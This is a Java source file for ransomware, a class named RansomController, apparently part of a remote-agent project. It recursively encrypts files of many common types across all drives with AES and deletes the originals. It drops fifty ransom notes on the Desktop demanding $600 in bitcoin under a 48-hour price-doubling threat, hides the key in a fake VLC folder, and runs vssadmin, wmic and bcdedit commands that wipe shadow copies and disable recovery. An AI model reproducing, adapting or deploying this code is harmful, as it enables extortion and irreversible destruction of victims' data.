package org.pandora.agent.control.impl;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;
import org.pandora.agent.Client;
import org.pandora.agent.encoding.EncodingManager;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.Key;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;

public class RansomController {

    private final EncodingManager encodingManager;
    private final ConcurrentLinkedQueue<String> extensions;
    private final ConcurrentLinkedQueue<String> files;
    private final String separator;
    private boolean processing;

    public RansomController(final Client client) {
        this.encodingManager = client.getEncodingManager();
        this.extensions = new ConcurrentLinkedQueue<>();
        this.files = new ConcurrentLinkedQueue<>();
        this.processing = false;
        this.separator = System.getProperty("line.separator");
        Collections.addAll(this.extensions, "ico", "dmg", "accdb", "tar", "gz", "sqlite3", "sqlitedb", "py", "wav", "cpp", "iso", "css", "html", "php", "js", "json", "doc", "csv", "gdoc", "gslides", "log", "key", "odp", "ods", "backup", "odt", "xls", "docx", "ppt", "txt", "xml", "psd", "java", "class", "rar", "zip", "jar", "md", "bin", "dat", "db", "sql", "sqlite", "bak", "exif", "bmp", "gif", "png", "jpg", "jpeg", "svg", "wav", "mp3", "mp4", "mpeg", "avi", "mov", "mpg", "properties", "lib", "cfg", "bat", "vbs", "iml", "yml", "vmx", "vmdk", "appinfo", "apk");
    }

    public void encrypt(final String key, final String walletAddress) {
        if (!this.processing && !this.isEncrypted()) {
            this.processing = true;
            this.addAllFiles(true);
            this.files.forEach(path -> {
                final File input = new File(path);
                final File output = new File(path + ".pdr");
               /* final String content = this.getContent(input);
                if (!content.equals(""))*/
                this.tryToEncrypt(input, output, key);
            });
            for (int i = 0; i < 50; i++)
                this.writeInFile(new File(System.getProperty("user.home") + "\\Desktop\\READ ME TO UNLOCK FILES_" + i + ".txt"),
                        "Watch out!" + this.separator +
                                this.separator +
                                "Don’t worry, you can recover all your files. Read it carefully." + this.separator +
                                this.separator +
                                "First of all, your files like your photos, videos, documents and all important files on your computer have been encrypted" + this.separator +
                                "and it is impossible for you to decrypt them. This means that you cannot recover your files at the moment." + this.separator +
                                this.separator +
                                "______________________________________________________________________________________________________________________________" + this.separator +
                                this.separator +
                                "Please read on to understand how to recover your files:" + this.separator +
                                this.separator +
                                "Q: What do I do ?" + this.separator +
                                this.separator +
                                "A: First, you need to pay service fees for the decryption." + this.separator +
                                "Send $600 in bitcoin to this bitcoin address: " + walletAddress + this.separator +
                                "Attention, you have 48h otherwise the price will double to $1200 in bitcoin." + this.separator +
                                this.separator +
                                "Then, once the payment is made, all your files will be automatically decrypted without you having to do anything." + this.separator +
                                this.separator +
                                "Q: How can I trust?" + this.separator +
                                this.separator +
                                "A: Don’t worry about decryption." + this.separator +
                                "We will decrypt your files surely because nobody will trust us if we cheat users." + this.separator +
                                this.separator +
                                "Q: How can I buy bitcoin?" + this.separator +
                                this.separator +
                                "A: To buy bitcoin, go on the internet and write \"how to buy bitcoin\"" + this.separator +
                                "You’ll find everything you need." + this.separator +
                                this.separator +
                                "Once this is done, you will send the bitcoin to: " + walletAddress + this.separator +
                                this.separator +
                                "______________________________________________________________________________________________________________________________" + this.separator +
                                this.separator +
                                "If you don’t pay, your files will be encrypted for life.", null);
            final File folder = new File(System.getenv("LOCALAPPDATA") + "\\VLC\\");
            final File file = new File(folder.getAbsolutePath() + "\\system.opt");
            if (!file.exists()) {
                try {
                    folder.mkdirs();
                    file.createNewFile();
                    this.writeInFile(file, key, key);
                } catch (final IOException ignored) {
                }
            }
            this.deleteAllBackups();
            this.processing = false;
        }
    }

    private void writeInFile(final File file, final String content, final String key) {
        try {
            final BufferedWriter writer = new BufferedWriter(new FileWriter(file.getAbsolutePath()));
            writer.write(key == null ? content : this.encodingManager.encode(key, content));
            writer.close();
        } catch (final IOException ignore) {
        }
    }

    public void decrypt(final String key) {
        final File file = new File(System.getenv("LOCALAPPDATA") + "\\VLC\\system.opt");
        if (!this.processing && this.isEncrypted() && this.getContent(file).replace("\n", "").equals(this.encodingManager.encode(key, key).replace("\n", ""))) {
            this.processing = true;
            this.addAllFiles(false);
            this.files.forEach(path -> {
                final File file2 = new File(path);
                this.tryToDecrypt(file2, new File(file2.getAbsolutePath().replace(".pdr", "")), key);
            });
            if (file.exists()) {
                try {
                    FileUtils.forceDelete(file);
                } catch (final IOException ignore) {
                    file.delete();
                }
            }
            final File desktopFolder = new File(System.getProperty("user.home") + "\\Desktop\\");
            if (desktopFolder.isDirectory() && desktopFolder.listFiles() != null)
                Arrays.stream(Objects.requireNonNull(desktopFolder.listFiles())).filter(desktopFile -> desktopFile.getName().startsWith("READ ME TO UNLOCK FILES_")).forEach(File::delete);
            this.processing = false;
        }
    }

    private void tryToEncrypt(final File input, final File output, final String key) {
        try {
            final Key secretKey = new SecretKeySpec(Base64.getDecoder().decode(key.getBytes(StandardCharsets.UTF_8)), "AES");
            final Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
            final FileInputStream inputStream = new FileInputStream(input);
            final byte[] inputBytes = new byte[(int) input.length()];
            inputStream.read(inputBytes);
            final byte[] outputBytes = cipher.doFinal(inputBytes);
            final FileOutputStream outputStream = new FileOutputStream(output);
            outputStream.write(Base64.getEncoder().encode(outputBytes));
            inputStream.close();
            outputStream.close();
            FileUtils.forceDelete(input);
        } catch (final Exception ignore) {
        }
    }

    private void tryToDecrypt(final File input, final File output, final String key) {
        try {
            final Key secretKey = new SecretKeySpec(Base64.getDecoder().decode(key.getBytes(StandardCharsets.UTF_8)), "AES");
            final Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
            final FileInputStream inputStream = new FileInputStream(input);
            final byte[] inputBytes = new byte[(int) input.length()];
            inputStream.read(inputBytes);
            final byte[] outputBytes = cipher.doFinal(Base64.getDecoder().decode(inputBytes));
            final FileOutputStream outputStream = new FileOutputStream(output);
            outputStream.write(outputBytes);
            inputStream.close();
            outputStream.close();
            FileUtils.forceDelete(input);
        } catch (final Exception ignore) {
        }
    }

    private String getContent(final File file) {
        if (file.exists()) {
            try {
                final BufferedReader reader = new BufferedReader(new FileReader(file));
                final StringBuilder inputBuffer = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) inputBuffer.append(line).append("\n");
                reader.close();
                return inputBuffer.toString();
            } catch (final Exception ignore) {
            }
        }
        return "";
    }

    private boolean isEncrypted() {
        return new File(System.getenv("LOCALAPPDATA") + "\\VLC\\system.opt").exists();
    }

    private void addAllFiles(final boolean encrypt) {
        this.files.clear();

        final File[] root = File.listRoots();
        if (root == null) return;
        for (final File disk : root)
            if (disk.listFiles() != null)
                for (final File file : Objects.requireNonNull(disk.listFiles()))
                    this.addFile(file.getAbsolutePath(), encrypt);
    }

    private void addFile(final String path, final boolean encrypt) {
        final File root = new File(path);
        final File[] list = root.listFiles();

        if (!root.exists() || list == null) return;

        for (final File file : list) {
            final String absolutePath = file.getAbsolutePath();
            if (file.isDirectory()) {
                if (!absolutePath.contains("\\Windows") && !absolutePath.contains("$"))
                    this.addFile(absolutePath, encrypt);
            } else {
                if (!file.getName().equals("VLC.jar") && !file.getName().startsWith("READ ME TO UNLOCK FILES_") && !this.files.contains(absolutePath) && (encrypt ? this.extensions.contains(FilenameUtils.getExtension(file.getName().toLowerCase())) : "pdr".equals(FilenameUtils.getExtension(file.getName().toLowerCase()))))
                    this.files.add(absolutePath);
            }
        }
    }

    private void deleteAllBackups() {
        this.exec("vssadmin delete shadows /all /quiet");
        this.exec("wmic shadowcopy delete");
        this.exec("bcdedit /set boostatuspolicy ignoreallfailures");
        this.exec("bcdedit /set {default} recoveryenabled no & wbadmin delete catalog –quiet");
    }

    private void exec(final String command) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (final IOException ignore) {
        }
    }
}
